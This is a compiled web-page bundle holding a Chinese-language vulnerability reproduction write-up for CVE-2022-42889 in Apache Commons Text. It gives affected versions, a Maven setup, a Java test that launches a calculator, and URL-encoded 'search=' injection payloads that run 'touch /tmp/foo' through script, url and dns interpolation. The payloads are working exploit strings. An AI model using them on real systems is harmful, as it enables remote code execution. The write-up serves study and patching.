import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as a}from"./app-58e4a7d6.js";const t={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Commons Text 项目实现了一系列关于文本字符串的算法，专注于处理字符串和文本块。10 月 13 日，Apache 发布安全公告，修复了 Apache Commons Text 中的一个远程代码执行漏洞（CVE-2022-42889）。Apache Commons Text 版本 1.5 到 1.9 中，由于不安全的插值默认值，当输入的参数不受信任时，可能导致远程代码执行。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.5.0 ≤ Apache Commons Text ＜ 1.10.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>IDEA 通过 Maven 导入依赖，pox.xml 如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;dependencies&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
        &lt;artifactId&gt;commons-configuration2&lt;/artifactId&gt;
        &lt;version&gt;2.7&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
        &lt;artifactId&gt;commons-text&lt;/artifactId&gt;
        &lt;version&gt;1.9&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
        &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;
        &lt;version&gt;3.12.0&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>测试代码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>package org.text;

import org.apache.commons.text.StringSubstitutor;

public class Main {
    public static void main(String[] args) {
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        // String payload = interpolator.replace(&quot;\${script:js:new
        // java.lang.ProcessBuilder(\\&quot;calc\\&quot;).start()}&quot;);
        String payload = &quot;\${script:js:new java.lang.ProcessBuilder(\\&quot;calc\\&quot;).start()}&quot;;
        interpolator.replace(payload);
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>Payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>search=\${script:javascript:java.lang.Runtime.getRuntime().exec(&#39;touch /tmp/foo&#39;)}

url编码
search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D

可以尝试
search=\${url:javascript:java.lang.Runtime.getRuntime().exec(&#39;touch /tmp/foo&#39;)}
search=\${dns:javascript:java.lang.Runtime.getRuntime().exec(&#39;touch /tmp/foo&#39;)}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h2><p>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。</p>`,14),s=[d];function l(r,c){return n(),i("div",null,s)}const u=e(t,[["render",l],["__file","Apache Commons Text 远程代码执行漏洞 CVE-2022-42889.html.vue"]]);export{u as default};
